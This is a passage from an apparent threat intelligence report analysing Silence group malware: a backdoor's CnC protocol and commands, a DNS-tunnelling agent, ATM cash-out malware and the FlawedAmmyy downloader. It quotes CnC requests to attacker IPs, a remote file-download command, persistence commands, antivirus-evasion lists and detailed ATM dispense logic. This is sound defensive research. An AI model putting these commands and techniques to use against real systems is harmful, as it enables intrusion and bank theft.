server. At the end of 2018, the developers \nchanged the method of command spelling: they stopped using Russian words typed in the English \nlayout.\nNetwork communications are performed using unencrypted connections via HTTP and GET \nrequests. The first request (<request1>) is sent to the CnC server in the following format: \nhttp://<cnc>/showthread.php?yz=1.\nExample of a request: \"http://185.29.10[.]26/showthread.php?yz=1\"26In response, the CnC server sends <response1>, which, according to the debug information in the \nfile, is the identifier of the client.\nGET /showthread.php?yz=1 HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\nHost: 185.29.10[.]26\nConnection: Keep-Alive\nHTTP/1.1 200 OK\nContent-Type: Tex/ascii\nDate: Thu, 29 Nov 2018 22:23:08 GMT\nConnection: keep-alive\nTransfer-Encoding: chunked\n1543530188357\nThe path to the script and the names of the yz= and User-Agent parameters can change to make \nit difficult to detect communication using traffic analysis tools.\nFollowing this, the file sends a second request (<request2>) to the CnC. This looks as follows: \n\"http://cnc/showthread.php?yz=2&alphayz=<response1>\", where <response1> is the server’s \nresponse to <request1>.\nПример:  \nGET /showthread.php?yz=2&alphayz=1543530188357 HTTP/1.1\nAccept: */*\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\nHost: 185.29.10[.]26\nConnection: Keep-Alive\nHTTP/1.1 200 OK\nContent-Type: Tex/ascii\nDate: Thu, 29 Nov 2018 22:23:08 GMT\nConnection: keep-alive\nTransfer-Encoding: chunked\n \nloikjhu27In response, CnC sends one of the supported commands. The tables below contain lists \nof connection types and CnC commands that the malware executes. \nType of connection Description Example of client request to CnC\nConnect1 Bot registration http://185.29.10[.]26/showthread.php?yz=1\nConnect2 Command request http://185.29.10[.]26/showthread.\nphp?yz=2&alphayz=1234567890\nConnect3 Sending command results http://185.29.10[.]26/showthread.\nphp?yz=2&alphayz=1234567890&betayz=aaaaabbbbccc\nCommand Type of command Description Example of use\nnviodgs reconnect Terminate the command interpreter \nsession, clear all temporary files, connect \nto CnC \"from scratch\"nviodgs\ncbthds restart Terminate the command interpreter \nsession and restart itcbthds\nloikjhu notasks No operation loikjhu\n#ipsum upload Upload a specified file to CnC #ipsum c:\\some_file.exe\n#lorem wget Download a file from a remote server  \nand save it in the current directory#lorem  \nhttp://84.38.134[.]103/f.exe 1.exe\npower\\n shell Launch the command interpreter power\\n\n\\n<cmd> run Execute an arbitrary OS command using \nthe command interpreter\\nipconfig28Detailed description of the commands: \n•  The restart command restarts the command interpreter, for example if the current console \nis unresponsive.\n•  The shell command launches a new hidden instance of the OS command interpreter, which \nwill be used to covertly launch commands on the infected machine (the last line in the table \nabove).\n•  The wget command delivers files from remote servers to PCs. The actor can specify which \nfile to download and what name to save it under. The files are saved in the folder from which \nthe executable file of the backdoor was launched. In the new version of the file, the command \nwill not start if a string of less than 72 characters has been passed to it.\n• The wput command is used to send the contents of a specified local file to the CnC server.\nIf none of the control commands are received from the CnC, the connection can \nbe re-established right away or with a one- or ten-second delay, in a cycle.\nCaptured data is encoded using the coding algorithm with the native alphabet, \nAiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_FnT8fOu4GoS,gvR6HMQ2hyPX, and is then \nsent to the CnC server.\nDespite the fact that the coding algorithm uses random data generation, the resulting coded data \ncan be decoded on the server by the attacker because:\n1.   The random data generator has small entropy (it only generates digits from 0 to 3).\n2.    The random data generator has been intentionally designed this way to ensure that random \ndata could be excluded based on the formula (since the result of multiplication will always \nbe divisible by 4, and the random numbers are always less than 4).\nEach character in the source data is coded into two symbols using two different arithmetic \noperations (formulas). This allows the source data to be decoded by solving a system of equations.\nEncryption of the command output is performed based on the following correspondence table:\nP 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\nC AiL7 alm3 Bzpx bZq0 CKs5 cYU1 Dkt- dVw Elr9 eNW FnT8 fOu4 GoS gvR6 HMQ2 hvPX\nAs shown in the table, each value from the P row uniquely corresponds to a value from the  \nC row. The elements in the C row are four-digit strings. Taking into account that \neach character in the alphabet AiL7aIm3BzpxbZq0CKs5cYU1Dkt-dVw.Elr9eNW_\nFnT8fOu4GoS,gvR6HMQ2hyPX belongs only to one line from the C row, you can make \na reversible transformation:\nP[index] = C[index][random % 4]\nLet’s consider an example: let's say you need to encrypt the character 7, hex(\"7\") = 0x37. The \nprogram splits the number into 3 and 7. First, it encodes the character 7, choosing any character \n(let it be \"V\") from the string “dVw.”. After that, it encodes the character 3, now choosing \nan encoding character from the string \"bZq0\" (let it be \"0\"). As a result, the program has encoded \nthe character \"7\" with the string \"V0\".29The program in question uses the following encryption algorithm:\nThe program can write an arbitrary string to the gxftcp.dat file in the current directory (from \nwhich the file in question was started). The string contains the address and port of the proxy \nserver (in text form), which has been used by previous samples to proxy traffic to the CnC. It is \nworth noting that the new version only contains the code for writing to the file, while the code \nfor reading the proxy and using the proxy for network communication no longer exists.\n30Comparison with the 2018 version \nBased on the binary comparison of the two file versions using the BinDiff utility, the 68% of the \nnew version consists of code used in the old version. The new version of the file contains 349 \nnew functions, only 56 of which have more than 50 instructions.\nThis means that the new version is a recompiled old version. The changes are described in the \ntable below.\nFeature Value for the  \n2017 version  Value for the intermediate \nversionValue for the new  \nversion\nApplication format An executable service file \nnamed Default monitorsAn executable service file  \nnamed Default monitorsA simple executable file\nDebug Data Section yes no no\nAvailability of \ndebug output \nOutptDebugStringA\\Wyes no no\nEncryption of settings and \nkey stringsno yes yes\nTypes of commands \nsupported htrjyytrn, htcnfhn, ytnpflfx, \n#wget, shell, runThe same commands + #wput. nviodgs, cbthds, loikjhu, power, \n#lorem, #ipsum\nParameters of the request \nConnect1index.php?xy=1 index.php?xy=1 showthread.php?yz=1\nParameters of the request \nConnect2index.php?xy=2&axy=[x] index.php?xy=2&axy=[x] showthread.\nphp?yz=3&alphayz=[x]\nParameters of the request \nConnect3index.\nphp?xy=2&axy=[x]&bxy=[y]index.\nphp?xy=2&axy=[x]&bxy=[y]showthread.\nphp?yz=2&alphayz=[x]&betayz=[y]\nProxy support yes yes no\nIs the gxftcp.dat file used no Yes Yes\nUser-Agent \\r\\n\\r\\n Microsoft Internet Explorer Mozilla/5.0 (compatible; \nMSIE 10.0; Windows NT 6.1; \nTrident/5.0)\nEncoding data from the  \nbot to backendYes The code has been slightly \nmodified, but the algorithm has \nnot changedNo change\nLlibrary used for network \ncommunicationWinhttp Winhttp Wininet31EDA\nOn 23 June 2019, Group-IB specialists tracked attacks on banks in Chile, Costa Rica, Ghana, \nand Bulgaria. The attacks involved a new tool, which is downloaded by the main Trojan Silence.\nMain and based on the Empire (https://github.com/EmpireProject/Empire) and dnscat2 (https://\ngithub.com/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1) open source projects for \npenetration testing. Group-IB dubbed the tool EmpireDNSAgent or EDA.\nThe file lisk.ps1 ( SHA1 f88d4e44d85ef3acc24c8b459c68915c76e792ed ) is a PowerShell script \nand is classified as the APT.Silence.EDA.ps1 agent. The program is designed to remotely control \nthe compromised system via the DNS protocol and supports the following commands: changing \nthe CnC address, downloading files from the network, sending a local file to the CnC server, \nexecuting commands in the cmd.exe command shell, collecting system information, rebooting \nand shutting down the system, and tunneling traffic.\nEDA has only 24 functions, 23 of which are borrowed from dnscat2 with some changes (there \nare 37 functions overall in dnscat2). There is also another function, which is a command handler \nfrom Empire.\n32Communication with CnC is performed through the nslookup command utility. The agent \nrequests a TXT record from the operator's DNS server, and then receives a command. \nUnlike dnscat2, the information is only encoded, instead of being encrypted. As such, the channel \nbetween the agent and the server is limited to 255 characters. Taking into account that these 255 \ncharacters include the domain, the points between each block of 64 characters (the maximum \nsubdomain length), and all these data are encoded in hex, it appears that the server can receive \nabout 120 bytes of data from the client at a time.\nThe function responsible for sending data and receiving commands from the server is shown \nbelow.\nxfs-disp.exe\nOn 25 February 2019, a malicious file designed to attack ATMs was uploaded to VirusTotal from \nRussia via the web interface. Its compilation date is 10 February 2019.\nThe file contains a path to the project on the developer's machine: C:\\_bkittest\\dispenser\\\nRelease_noToken\\dispenserXFS.pdb.\nThe program is designed to:\n• receive information about various ATM devices and display it to the administrator either \nin a log file or in a window on the screen.\n• substitute ATM cassette data.\n• withdraw cash from ATMs.\n33The malicious program scans all running processes (except its own) for msxfs.dll and injects code \ninto the process where the .dll file is detected.\n• Processes are enumerated using the Process32FirstW and Process32NextW functions.\n•  Modules loaded into the processes are enumerated using the OpenProcess, \nEnumProcessModulesEx, and GetModuleFileNameExA functions.\nOnce the msxfs.dll module has been detected in one of the processes, the application creates the \nmutex Global\\\\[x][pid] to block a possible repeated injection into the same process.\nx is the number 1337 in hex (hard-coded); the unaffected bits of the number are filled with \nzeros.\npid is the process identifier for the injection in hex; the unaffected bits of the number \nare filled with zeros;\nAn example of the resulting mutex value (as a string) for pid: == \n2100- \"Global\\ \\0000053900000834\".\nIf such a mutex already exists, the application does not inject its code into the current process.\nIf the mutex does not exist, a shellcode of 4,960 bytes is injected into the current process. The \ninjection is performed using the VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread \nfunctions.\nThe shellcode is used to enumerate all threads in the application in a loop (except the shellcode \nthread), freeze the threads and then call the WFSCleanUp() function in a cycle to terminate the \nconnection between the application and the XFS Manager.\nThe application in question creates a log file called C:\\xfsasdf.txt during its operation and writes \ndetailed debug messages to it.\n34The program creates a window of the win32app class with the name NO_TOKEN and displays \ndebug information in it:\nFollowing this, the application creates a new thread, in which it sends a message to the above-\nmentioned window in an eternal loop with an interval of 1 second to display it on top of other \nwindows, even when the window is deactivated.\nTo launch the main stream with a payload, the WM_COMMAND message is sent with wParam == \n0x1337.\nThe application alternately attempts to open service providers of dispensers for Nautilus, Diebold, \nNCR, and Wincor ATMs.\nIf the version of the dispenser service provider is 2, the program receives data on ATM cash units \nusing one of the following methods:\n•  By calling the function WFSGetInfo() with the flag dwCategory == WFS_INF_CDM_\nCAPABILITIES the attacker receives the value of the field wMaxDispenseItems from \nthe _wfs_cdm_caps structure to find out the maximum number of banknotes that can \nbe dispensed in a single operation. This information is displayed to the administrator \nand stored in the log.\n•  By calling the function WFSGetInfo() with the flag dwCategory == WFS_INF_CDM_\nSTATUS the attacker receives values for the fields fwDevice, fwSafeDoor, fwDispenser, \nand fwIntermediateStacker from the _wfs_cdm_status structure to find out the current status \nof the dispenser (whether it is connected and busy), the state of the safe door, the state \nof the dispenser’s logical cash units, the state of the shutter, etc. This information is displayed \nto the administrator and stored in the log.\n•  By calling the function WFSGetInfo() with the flag dwCategory == WFS_INF_CDM_CASH_\nUNIT_INFO, the attacker can gain information about the status and contents of ATM \ncassettes. The output is displayed as a format string Id:%s(nr=%d)(l=%d,h=%d), %d|%d|%d \nof %d [%s][%d][%d],[%d][%d]\\n, where the numbers from the output of the above-mentioned \n35function are added instead of %s and %d. This information is displayed to the administrator \nand stored in the log.\n•  Cash is then withdrawn by calling the function WFSExecute with the flag \ndwCommand==WFS_CMD_CDM_DISPENSE (dispense banknotes from cassettes). That said, \nthe value of cCurrencyID which is used as an identifier of the required currency is set to “   ” \n(0x202020 in hex). We did not manage to identify the currency type by ID.\nThe code of the WFS_CMD_CDM_DISPENSE command to issue banknotes from cassettes serves \nas the second argument. The banknote denomination parameters are transmitted during the call. \nDenomination is the process of selecting the number of banknotes from specific cassettes to be \nput together for a required sum for withdrawal (i.e. which banknotes are to be dispensed).\nТThe structure below serves as the third argument:\nThe code below is used to fill this structure in the bot.\nThe denomination structure is filled with the values received when calling the function \nof obtaining the number of available banknotes, probably in order to extract the entire contents \nof ATM cassettes at once.\nInterestingly, the field bPresent in this structure is set to TRUE. This means that after the \ncommand is executed to collect banknotes from the cassettes, they will be dispensed to the \ncustomer.\nThe steps for collecting data about cassettes and dispensing cash are repeated four times \nin a cycle.\n36If the version of the dispenser service provider is 3, the program performs the following actions:\n1. Sends the RESET command to CDM by calling the WFSExecute function with the flag \ndwCommand == WFS_CMD_CDM_DISPENSE \n2. Receives data about ATM cash units.\n3. Receives the maximum number of banknotes that can be withdrawn in a single operation \nusing the same method as in version 2 (described above).\n4. Receives the current status of the dispenser (whether it is connected and busy), the state \nof the safe door, the state of dispenser’s logical cash units, the state of the shutter, etc. using \nthe same method as in version 2 (described above).\n5. Receives information about cassettes and banknotes in the same way as in version \n2 (described above).\n6. Cash is then withdrawn by calling the WFSExecute function with the flag dwCommand == \nWFS_CMD_CDM_DISPENSE (dispensing banknotes from cassettes).\n7. If an error with the code -306 occurs, the WFSExecute function is called with the \ndwCommand == WFS_CMD_CDM_PRESENT flag to open the shutter and cause banknotes \nto be dispensed.\n8. The steps for collecting data about cassettes and dispensing cash are repeated four times \nin a cycle .\n9. Re-sends the RESET command to CDM.\nIf the version of the dispenser service provider is 3 and the application has been started with the \ncommand line argument --exchange:\n1. CMD is set to RESET mode by calling the function WFSExecute with the flag  \ndwCommand == WFS_CMD_CDM_START_EXCHANGE.\nCommand description from the specification:\nWFS_CMD_CDM_START_EXCHANGE\nDescription This command puts the CDM in an exchange state, i.e. a state in which cash units \ncan be emptied, replenished, removed or replaced.\n2.   CMD terminates RESET mode by calling the WFSExecute function with the flag  \ndwCommand == WFS_CMD_CDM_END_EXCHANGE.\nWFS_CMD_CDM_END_EXCHANGE\nDescription This command will end the exchange state. If any physical action took place as a \nresult of the WFS_CMD_CDM_START_EXCHANGE command then this command will cause the cash units \nto be returned to their normal physical state. Any necessary device testing will also be \ninitiated.\nThe application can also use this command to update cash unit information in the form \ndescribed in the documentation of the WFS_INF_CDM_CASH_UNIT_INFO command.\nIt modifies the WFSCDMCUINFO structure (and the structure WFSCDMCASHUNIT embedded in it), \nwhich is passed as an argument when calling the function WFSExecute(WFS_CMD_CDM_END_EXCHANGE)373. Sets the number of cassettes to 6.\n4.  Renames each cassette to \"USD*\".\n5.  Sets the number of bills to 1,000 for each cassette.\n \n6.  Retrieves data about cassettes by calling the function WFSExecute with \nthe flag dwCommand==WFS_INF_CDM_CASH_UNIT_INFO, modifies data \nreceived and updates them by calling the function WFSExecute with the flag \ndwCommand==WFS_CMD_CDM_SET_CASH_UNIT_INFO.\n7.  Values are replaced by enumerating all logical and physical cash units and modifying fields \nof the WFSCDMPHCU and WFSCDMCASHUNIT structures. The number of banknotes \nin a cassette is set to 1,000.\nThis could be the maximum number of notes in a cassette, which is why this value is set for the \nulCount and ulInitialCount fields in order to withdraw the maximum amount of cash from ATMs.\n38FLAWEDAMMYY ANALYSIS  \nAND ITS COMPARISON WITH  \nSILENCE.DOWNLOADER\nThe analysis of Silence’s activities by Group-IB experts revealed that FlawedAmmyy.Downloader \nand Silence.Downloader are written by the same person. That said, the infrastructure used for \nFlawedAmmyy attacks differs greatly from Silence attacks, which means the attacks themselves \nare not interrelated.\nSince early summer 2018, FlawedAmmyy.Downloader has been used in attacks on various targets \nin various regions. Some researchers believe this tool is used by the TA505 group to conduct \nits operations. \nAccording to Group-IB analysts, the developer is a Russian speaker and works actively \non underground platforms. It should be taken into account that the author of Silence.Downloader \ndeveloped only FlawedAmmyy.Downloader. We cannot determine whether he or she is the \nauthor of  FlawedAmmyy.Payload.\nCurrently, we cannot confirm or deny the participation of this developer in Silence operations. \nWe can only claim that the author develops software for hackers. \nDigital certificate\nIn December 2018, two incidents were discovered in which Silence.Downloader  \n(SHA1 81673f941092618231599e910300249e13903c32 ) was signed with the same \ncertificate as FlawedAmmyy ( SHA1 7c5f06b9c929f0effcb052e87ddfb07b814a41d5  and \n9b3fa43a3bb13571fb8f07df69beee8b077ac938 ):\nThe same certificate was used by FlawedAmmyy.Downloader  \n(MD5 7af426e0952b13ef158a4220e25df1ae ). \n39Description and background of FlawedAmmyy\nOn 10 January 2017, the source code of a remote control tool called Ammyy Admin was \npublished online in a public repository.\nFlawedAmmyy is a modified version of Ammyy Admin, which is based on source code leaked \nin 2017. The Downloader’s main task is to download FlawedAmmyy and install it into the system. \nBoth Downloader and Payload are very specific and stand out from other versions based on the \nsame source code.\nFlawedAmmyy.Downloader\nThe file is designed to download an executable file from a remote server \nat http://31.207.45[.]85/d.dat and run it. It contains many fake API calls, which were added \nto generate a file import table similar to a non-malicious one. The goal is to bypass the heuristics \nof AV products.\n40The file contains gibberish (shown below), which is most likely used to bypass antivirus emulators.\nThe file will terminate its operation once it has detected that one of the following processes \nbelonging to antivirus solutions is running: QHACTIVEDEFENSE.EXE, QHSAFETRAY.\nEXE, QHWATCHDOG.EXE, CMDAGENT.EXE, CIS.EXE, V3LITE.EXE, V3MAIN.EXE, V3SP.\nEXE, EGUI.EXE, EKRN.EXE, SPIDERAGENT.EXE, DWENGINE.EXE, DWARKDAEMON.EXE, \nBULLGUARDTRAY.EXE, BDAGENT.EXE, BULLGUARD.EXE, BDSS.EXE, or BULLGUARD.EXE.\nIn the event that the file has been launched under an administrator account, it performs the \nfollowing actions:\n1. Terminates the process named wsus.exe four times in a row (if it is present);\n2. Deletes the following AMMYY files, if they are present:\n%COMMON_APPDATA%\\\\AMMYY\\\\wmihost.exe\n%COMMON_APPDATA%\\\\AMMYY\\\\settings3.bin\n%COMMON_APPDATA%\\\\Foundation\\\\wmites.exe\n%COMMON_APPDATA%\\\\Foundation\\\\settings3.bin\n%COMMON_APPDATA%\\\\Foundation1\\\\wmites.exe\n%COMMON_APPDATA%\\\\Foundation1\\\\settings3.bin\n%COMMON_APPDATA%\\\\Microsoft\\\\wsus.exe\n%COMMON_APPDATA%\\\\Microsoft\\\\settings3.bin\n%COMMON_APPDATA%\\\\Microsoft Help\\\\wsus.exe\n%COMMON_APPDATA%\\\\Microsoft Help\\\\settings3.bin\n%COMMON_APPDATA%\\\\Microsofts Help\\\\wsus.exe\n%COMMON_APPDATA%\\\\Microsofts Help\\\\settings3.bin\n3. Deletes the following AMMYY directories, if they are present: \n%COMMON_APPDATA%\\\\Settings\n%COMMON_APPDATA%\\\\Microsoft\\\\Enc\n%COMMON_APPDATA%\\\\AMMYY\n%COMMON_APPDATA%\\\\Foundation\n%COMMON_APPDATA%\\\\Foundation1\n4.  Starts the following commands to terminate and delete the AMMYY service, if it is currently \nrunning:\ncmd.exe /C net stop foundation\ncmd.exe /C sc delete foundation\n5. Terminates the process named wsus.exe twice in a row (if it is present).\n6. Creates the following directory: %COMMON_APPDATA%\\\\Microsofts Help.417.  Downloads an encrypted file from the network host http://31.207.45[.]85/d.dat and saves \nit under the name of the form %COMMON_APPDATA%\\Microsofts Help\\temp_[random_\ndword].FOOP0xFCBEEA. An example of file location on disk: C:\\ProgramData\\Microsofts \nHelp\\temp_84c350.FOOP0xFCBEEA.\nThe file is requested from a remote node using GET requests via unencrypted HTTP. An example \nof a file request is shown below:\nGET /d.dat HTTP/1.1\nHost: 31.207.45[.]85\nCache-Control: no-cache\n8.  Reads and decrypts the contents of the file %COMMON_APPDATA%\\Microsofts Help\\\ntemp_[random_dword].FOOP0xFCBEEA. For decryption, the RC4 algorithm is used with the \nkey ZAKDSh327uif.\n9.  Writes the decryption result (unencrypted file) to the file %COMMON_APPDATA%\\\nMicrosofts Help\\\\wsus.exe.\n10.  Removes the temporary file %COMMON_APPDATA%\\Microsofts Help\\temp_[random_\ndword].FOOP0xFCBEEA.\n If the first two bytes of the decrypted file are not the “MZ” characters – which means the \nexecutable file has not been decrypted correctly – the file will be terminated and self-\nremoved. The self-deletion is performed by running the shell with the arguments  \n/del [exefile] >> NUL.\n11. Following this, it executes the decrypted file %COMMON_APPDATA%\\Microsofts Help\\\\\nwsus.exe.\n12. If the file has been successfully launched, it will re-delete the temporary file.\n13. Adds the launched file to autostart. This is done in one of three ways:\na. Autostart via system registry:\n [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n“MicrosoftsSOftWare”= %COMMON_APPDATA%\\Microsofts Help\\\\wsus.exe\nb. By creating a delayed task in Windows Task Scheduler: \nThe task has the name Microsoft Window Center, starts when the current user logs \nin to the account, and has a specific feature: a hard-coded initial activation date, which \nis not important for autostart due to the presence of the condition that the file is launched \nwhen the user is logging in.\nc.  By creating a delayed task using COM and connecting to a objectCLSID_TaskScheduler \nclass object:42\n14.  Autorun by creating and launching an auto-start service under the name foundation. This \nis done by calling commands of the form:\n\"sc create foundation binPath= \\»[exename] -service\\» type= own start= auto error= \nignore\"\n\"net.exe start foundation y\"\nIf the file has been started under an admin account, the file ensures persistence in the system \nusing the auto-start service.\nIf the file has not been started under an admin account, the file ensures persistence in the system \nusing the registry and the task scheduler (once a task is created, it is immediately executed).\nThe executable file then terminates its operation and deletes itself from the system.\nFlawedAmmyy.Payload\nAt the entry point, the file with the payload performs the same checks for running anti-virus \nprocesses, anti-emulator and fake API calls to bypass heuristics.\nFollowing this, the program creates a ServerApp class object containing 3 methods described \nin a ServerApp class virtual table:\n.rdata:0048AFE8 ; const ServerApp::`vftable'\n.rdata:0048AFE4                 dd offset ??ServerApp@@6B@ ; const ServerApp::`RTTI Complete \nObject Locator'\n.rdata:0048AFE8 ; const ServerApp::`vftable'\n.rdata:0048AFE8 ??_7ServerApp@@6B@ dd offset unknown_libname_3\n.rdata:0048AFEC                dd offset Init          \n.rdata:0048AFF0                 dd offset server_start\n.rdata:0048AFF4                 dd offset server_stop\n43The first (pre-initialisation of the application) and the second (server start) methods are called:\n•  Compared to the original source code, initial functions that are used to check the command \nline arguments of the application, such as AmmyyApp::ParseCommandLine(), etc., have been \nremoved from the file. The launch is hardcoded: either as a service or as an application, \nwithout additional unnecessary application execution options.\n•  Depending on how the .exe file (an application or service) has been started, a particular \nfunction will be executed.\nOther changes compared to the source code:\n• the name of the log file has been changed from AMMYY_service.log to service.log;\n•  the name (description) of the service (AMMYYSERVICENAME AmmyyAdmin) has been \nchanged to FossPass;\n•  the name of the service, which is used to name the application saved in the registry, has \nbeen changed to netsxuid.\nThe service name is saved in the registry as follows:\n[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\services]\n“netsxuid”=<rnd_dword>\nA binary comparison of the sample and the legitimate versions of the Ammyy Admin application \nshows that they differ greatly.\nThe sample has new features that are not included in the legitimate application, redesigned \ncode structure, and data whose creation would have been impossible without recompiling the \napplication’s source code.\nAll these facts indicate that the file is a modified version of the published source code.\nTwo modifications have been added to the TrClient::Run() function, which is called while \nconnecting to the CnC and sending and receiving commands:\n•  After connecting to the CnC server (the ConnectToRouter() function), the application collects \ndata about the compromised system and sends it to the CnC;\n•  Below is a list of supported AMMYY command types. Each type of command corresponds \nto a specific command that can be received remotely from an attacker (CnC) and executed.44{\n   // viewer <-> target  both ways\n   aaNop            = 10,\n   aaPingRequest = 11,                   // uses by Router also\n   aaPingReply   = 12,                     // uses by Router also\n   aaSound                    = 13,\n   aaCutText      = 14,\n \n   // target -> viewer\n   aaScreenUpdate  = 21,\n   aaSetColourMapEntries = 22,        \n   aaPointerMove     = 23,\n   aaError      = 24,\n   aaDesktopUnavailable  = 25,\n \n   // viewer -> target\n   aaSetEncoder           = 40,\n   aaDesktopOFF          = 41,\n   aaSetPointer             = 42,\n   aaScreenUpdateRequest = 43,   // full screen update request\n   aaScreenUpdateCommit  = 44,\n   aaKeyEvent         = 45,\n   aaPointerEvent    = 46,\n   aaRDP                 = 47,\n   aaDirectConnect                   = 48,\n   aaSpeedTest                         = 49,\n // FileManager: viewer -> target\n   aaFileListRequest    = 60,\n   aaFolderCreateRequest = 61,\n   aaRenameRequest                       =  62,\n   aaDeleteRequest                  =  63,\n   aaDnloadRequest                          =  64,\n   aaUploadRequest                          =  65,\n   aaUploadData           =     66,\n   aaUploadDataLast     =  67,\n   aaDnloadDataAck                         =  68,\n \n   // FileManager: target -> viewer\n   aaFmReply                                    =  70,\n   aaUploadDataAck                 =  71,\n   aaDnloadData           =  72,\n   aaDnloadDataLast     =  73,\n};            45Compared to the original source code, commands with the codes 50, 51, 52, 53, 54, 55 have \nbeen added to the examined file. The table below shows the values of the added command types:\nCommand Function\n50 Run an arbitrary command and store its output\n51 No operation\n52 Collect and upload system information\n53 Extract an executable file from resources, run it and save the results of its operation  \nto the file log.txt.\n54 System reboot\n55 Self-removal\nOnce command 53 is received, the application extracts one of the executable files (for x86 or x64 \narchitecture) from the resources of the application, saves it under the name %Temp%\\default.\nbin, executes it, and saves the results of its operation into the file log.txt. The analysed sample \ndoes not contain executable files that are extracted when command 53 is received. However, \nbased on the debug information and features of the function code, it can be suggested that the \nresources may contain Mimikatz, an application designed to retrieve user credentials.\nThe path to the directory on the attacker's PC where the malicious file has been assembled  \nis s:\\new stage\\freelance\\ice\\clear_av_ammy\\1\\clear\\ammyygeneric\\get\\.\nComparison of FlawedAmmy.Downloader  \nwith Silence.Downloader\nDuring the analysis of new FlawedAmmy samples, we noted the following similarities  \nto Silence.Downloader:\n• File names\n• Similar code fragments\n• Code obfuscation methods used.\nHaving studied the two files, we can conclude that these are two different tools with many \nconnections between them.\nSilence.Downloader is a universal resident loader, which collects system data, sends it to the CnC, \nadds itself to startup, and receives commands to download any files from the remote attacker.\nFlawedAmmy.downloader is a target non-resident loader for the FlawedAmmy tool, which \nconfigures the system to start a service called foundation, downloads and launches the file, \nand then deletes itself.\nGroup-IB specialists analysed the following samples: 461.  A file named\n\"600e1adba4983692e9b74e631e155eab65279dd2ab73bb35fbd6e0e84d0e68a5\" \n(размер 126976 ба йт, MD5 94531c20462f69c6135c4d0a06925471 )\nwhich is a FlawedAmmyy RAT loader.\n2. A file named\n\"18462ae676c539b2a3626a7b465123b20c88bd68342777a090f40b7dcb7ace0d\" \n(размер 115200 ба йт, MD5 914F6BA6A3A043ECC961296FA94A6BAD )\nwhich we classify as Silence.Downloader.\nCommon characteristics of the samples:\n• The same programming language, development environment and the same version were used \nfor compilation – Visual Studio 2013 (based on information extracted from the Rich header \nof the executable file);\n• Identical technique for generating a non-executable code portion containing multiple fake API \ncalls (without a single argument). This technique is designed to generate legitimate-seeming \nimport tables and complicate its detection by heuristic antivirus methods.\n• For generation, a function from Windows API – CoCreateGuid() – is used. It generates \na unique 128-bit number. The result of the function is written to the GUID structure. Below \nis a formal definition of the GUID structure:\ntypedef struct _GUID {\n    DWORD Data1;\n    WORD  Data2;\n    WORD  Data3;\n    BYTE  Data4[8];\n}; \n Both files use only a part of the fields from this structure. As a result, the number will \nbe calculated using the following formula:\n For FlawedAmmy.Downloader:\nGUID_INT = GUID.Data3 + GUID.Data1 * GUID.Data2\n For Silence.Downloader:\nGUID_INT = GUID.Data1 * GUID.Data2 + GUID.Data3 + 0xCB6\nGUID_INT = GUID.Data1 * GUID.Data2 - GUID.Data3 + 0xD435\nFor FlawedAmmyy.Downloader, decrypted files will be saved to the following path:47%COMMON_APPDATA%\\Microsofts HeIp\\template_[GUID_INT].DATAHASH\nFor Silence.Downloader, decrypted files will be saved to the following path:\n%APPDATA%\\[GUID_INT].dates (a temporary encrypted file)\n%APPDATA%\\CHROME-[GUID_INT].exe (a decrypted file)\n•  The same criteria are used to check the size of the downloaded file. The file size must exceed \n4,000 bytes. This is a rather unique number, which is used instead of typical 4096 or 1024.\n•  The same criterion is used to check the contents of the downloaded file. The first two bytes \nof the file are checked, and they must be equal to “MZ”, which corresponds to the header \nof the executable file.\n•  A specific sequence of steps taken to download the file, which includes sending a request, \nwriting a CnC response to the file, reading the file, checking whether the file size is over \n4,000 bytes, checking for MZ, decrypting the file, saving the decrypted file, and executing \nthe file. \n   An unusual detail in this sequence is that in both samples the size of the downloaded content \nis checked after the file has been written to disk. If the CnC returns <= 4000 bytes, however, \nwriting the CnC response to the file will not be necessary at all. In both samples, this check \nis made after the response has been written to the file. \n  Another non-typical feature is that after the server response is written to the file, two \nchecks are performed, during which the written file is read and its contents are decrypted \nand rewritten into the same file. This sequence contains many redundant steps: it would \nbe sufficient to simply perform a request to the CnC, compare its length to 4,000, decrypt \nthe response and write it to the file in the event of its first two bytes being equal to “MZ”. \nThe presence of such redundant and similar stages may indicate that the code was borrowed \nand copied from other projects.\n• Similar values of the delay function arguments.\n• Identical RC4 decryption algorithm for downloaded files.\n  The decryption key of the downloaded files is Pqoi73jGdjwenYew33 for the FlawedAmmyy \nRAT loader, and jgsi23894uhnfjusiof for Silence.Downloader (for decrypting non-file \ndata, for example, commands from server responses. Silence.Downloader has other keys: \nFKh23yu7T*&^@# and WiJyQaEaAixoRyCu).\n• Identical self-removal code.\n• The same set of API functions used.\nDifferences between the samples:\n•  FlawedAmmy.Downloader is non-resident. This means that it starts, downloads and runs the \nfile and deletes itself.\n•  Silence.Downloader is resident. It copies itself to %All Users\\Application Data%\\WIN7Z\\48wsus.exe, then adds itself to startup (the Run registry key) and executes requests to the \nCnC in a cycle with an interval of 2 minutes. It removes itself only when it receives the KILL \ncommand from CnC.\nCriterion Value in FlawedAmmyy.Downloader Value in Silence.Downloader\nDevelopment environment  \nusedVisual Studio 2013 Visual Studio 2013\nGibberish import table Yes Yes\nMethod of generating \ndownloaded file names using \nGUID and the CoCreateGuid() \nfunctionYes Yes\nChecking the downloaded  \nfile sizeOver 4,000 bytes Over 4,000 bytes\nChecking the contents of the \ndownloaded fileThe first 2 bytes - “MZ” The first 2 bytes - “MZ”\nFile download steps Sending a request, writing a CnC response to a \nfile, reading the  file, checking if the file size is \nover 4,000 bytes, checking for MZ, decrypting \nthe  file, saving the decrypted file, executing \nthe file.Sending a request, writing a CnC response \nto a file, reading the file, checking if the file \nsize is over 4,000 bytes, checking for MZ, \ndecrypting the  file, saving the decrypted \nfile, executing the file.\nArgument values of the delay \nfunctionSleep(5000);\nSleep(3000);\nSleep(3000);\nSleep(1000);Sleep(1000);\nSleep(50);\nSleep(3000);\nSleep(3000);\nSleep(3000);\nSleep(3000);\nSleep(5000);\nSleep(120000);\nDecryption algorithm for  \ndownloaded filesRC4 RC4\nAPI call method Dynamic search Static call from an import table\nLoader type Non-resident Resident\nIs the 